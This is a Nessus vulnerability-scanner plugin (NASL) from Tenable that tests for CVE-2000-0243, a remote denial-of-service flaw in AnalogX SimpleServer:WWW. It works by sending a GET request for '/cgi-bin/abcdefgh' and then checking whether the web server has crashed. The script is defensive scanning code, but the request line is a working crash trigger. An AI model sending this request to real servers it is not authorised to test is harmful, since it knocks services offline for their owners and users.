#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10366);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-2000-0243");
 script_bugtraq_id(1076);
 script_xref(name:"OSVDB", value:"1265");

 script_name(english:"AnalogX SimpleServer:WWW Short GET /cgi-bin Remote DoS");
 script_summary(english:"Crash the remote HTTP service");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of the AnalogX SimpleServer web
server that is affected by a remote denial of service vulnerability.
An attacker could exploit this vulnerability to crash the affected
application by requesting a URL with exactly 8 characters following
the '/cgi-bin/' directory." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-03/0274.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrading to SimpleServer 1.0.4 or newer reportedly fixes the issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

 port = get_http_port(default:80);

 banner = get_http_banner(port:port);
 if ( "AnalogX Simple Server" >!< banner )exit(0);

 if (http_is_dead(port: port)) exit(0);

r = http_send_recv3(method:"GET", item:"/cgi-bin/abcdefgh", port:port);
sleep(5);
if (http_is_dead(port: port)) security_warning(port);
  
